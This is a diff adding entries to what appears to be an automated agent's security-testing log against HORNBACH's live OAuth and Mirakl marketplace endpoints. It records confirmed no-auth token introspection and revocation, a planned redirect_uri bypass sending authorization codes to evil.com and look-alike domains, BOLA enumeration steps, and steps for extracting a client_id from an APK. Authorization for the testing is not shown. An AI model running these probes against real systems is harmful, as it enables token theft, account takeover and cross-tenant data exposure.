@@ -500,3 +500,33 @@ impact: cross-tenant PII/provisioning abuse IF token obtained; nil anonymously; 
 testability: AUTH_HELPED
 [NEXT] HUMAN: Obtain a valid cidaas client_id (extract ClientId from de.hornbach APK's cidaas.xml/strings.xml, or capture client_id from the /authz-srv/authz redirect during a manual hornbach.de login) — the sole gate to converting the POST-confirmed no-auth introspect/revoke 200/200 into a reportable PoC with a real token (metadata exfil + silent revocation). All anonymous OAuth escalation paths remain blocked by the client_id gate.
 [RISK] hornbach: 50/100 — token-plane no-auth introspection+revocation re-confirmed live on the correct POST shape this session, resolving the KB's persistent 404/200 contradiction and strengthening it as the single most defensible systemic finding (RFC 7662/7009); token issuance correctly gated (isolates the flaw to the management plane); HS256/RS256 dual-alg in metadata flags a JWT confusion candidate but is unproven; SCIM provisioning 401-gated controllers confirmed; all impact-chain content (real-token exfil, silent revoke) still gated on client_id+token acquisition; no anonymous PII reachable; critical path remains client_id extraction.
+## 2026-09-05 12:18:31 UTC [target] (model bigpickle)
+[HYP] Unauthenticated token-management plane bypass — introspect JSON+form, revoke, both zero client auth; issuance correctly gated
+class: AUTH
+asset: auth.hornbach.com/token-srv/{introspect,revoke}
+confidence: 78
+reasoning: POST introspect `token=fake` as form OR JSON → 200 `{"active":false}`; POST revoke → 200 `OK`; empty body → 400 `unauthorized_client`; token-srv/token issuance → 400 `invalid_client` (gated). Metadata advertises introspection/revocation auth_methods=[client_secret_basic,post,jwt,private_key_jwt] but router enforces none — body-presence is the sole gate. Stable ≥4 sessions (09-04 14:20/19:53/22:16, 09-05 00:12/08:45/12:0x).
+evidence_needed: real access_token → no-auth introspect returns sub/scope/exp/client_id; no-auth revoke then re-introspect → active=false (silent session kill)
+verify_steps: (DONE) POST form + JSON fake token → 200 both; token/token → 400 invalid_client; empty body → 400. NEXT (client_id+token): POST `token=<real>` to introspect no-auth → claim set; POST revoke; re-introspect → active=false
+impact: token theft → metadata exfil (claims incl sub/scope/exp/client_id) + silent forced-reauth/interception + account-session DoS on identity plane; MEDIUM, gated on possessing a token
+testability: AUTH_HELPED
+[HYP] OAuth redirect_uri validation bypass via cidaas authz endpoint
+class: OATH
+asset: auth.hornbach.com/authz-srv/authz
+confidence: 60
+reasoning: Endpoint live; returns HTTP 200 login/consent for a valid client_id (per KB) vs uniform 302→AUTH10007 for invalid; redirect_uri processed pre/post client validation per OAuth; cidaas historically matches redirect_uri with regex/wildcard allowlists. All impact chains (code theft → token → introspect/revoke abuse) pivot here.
+evidence_needed: valid client_id + redirect_uri variation (https://evil.com, https://hornbach.de.evil.com, .hornbach.de@evil.com, //, /..;/...) delivering authz code to attacker origin
+verify_steps: (blocked until client_id) GET /authz-srv/authz?response_type=code&client_id=<id>&scope=openid&redirect_uri=https://evil.com → observe 302-to-evil vs error; iterate bypass shapes only with possession of client_id
+impact: authorization-code theft → session/ATO chain; requires client_id to even begin
+testability: AUTH_HELPED
+[HYP] Mirakl authenticated L0 API BOLA/IDOR across partner tenants
+class: IDOR
+asset: hornbach-mp.mirakl.net/api/*
+confidence: 45
+reasoning: /api/{orders,listings,accounts,payments,catalog/products,categories,attributes,feeds,configurations} all live behind uniform 401 (L0 API, standard Mirakl v3.1301); dummy-vs-missing API key → identical 401 (no format differential). cidaas/OAuth gate to a marketplace operator credential is the only blocker.
+evidence_needed: Mirakl API key (operator or seller) → cross-shop BOLA on orders/listings/payments across shop_id; anonymous routes confirmed non-existent
+verify_steps: (DONE) 10 L0 routes → 401; key-format diff → none. NEXT (with any marketplace credential): enumerate shop_ids at /api/orders?shop_id=N, /api/accounts/extrafields, /api/dos — BOLA checks
+impact: cross-tenant seller/order/payment data if a credential leaks; nil anonymously; LOW-MEDIUM
+testability: AUTH_HELPED
+[NEXT] HUMAN: Obtain a valid cidaas client_id — the sole gate across all three FINAL chains. Revised priority: (1) capture `client_id` from the `/authz-srv/authz` redirect during a manual www.hornbach.de login in a fresh browser (bot-challenge passes in a real browser; the OAuth start URL is on the login flow); (2) fallback: the HORNBACH main shopping app is absent from Google Play/APKMirror (likely retired→PWA), so use the HORNBACH Smarthome app (`de.hornbach.app.smarthome`, shares the same cidaas tenant) — install on an Android device/emulator and extract `assets/cidaas.xml` (client_id + redirect_uri scheme) via device filesystem or `adb backup`; APK-mirror scraping is bot-walled (APKPure CF-challenge, APKCombo 404, uptodown blocked) and NOT worth further automation.
+[RISK] hornbach: 52/100 — token-management-plane no-auth introspect+revoke (200/200) re-confirmed this session with the new isolation fact (issuance 400 invalid_client) making it the single most defensible systemic finding (RFC 7662/7009); request-shape fully resolved (JSON+form, body-presence gate); new infra intel `sapigwprd02` on api.hornbach.de healthcheck; health-srv/metrics-srv 403-gated (no surface); SCC/redirect_uri/Mirakl chains all still client_id-gated; APK extraction path degraded (main app retired/PWA; mirrors bot-walled) pushing client_id to HUMAN browser capture; no anonymous PII reachable; critical path remains client_id acquisition, then real-token introspect/revoke PoC.
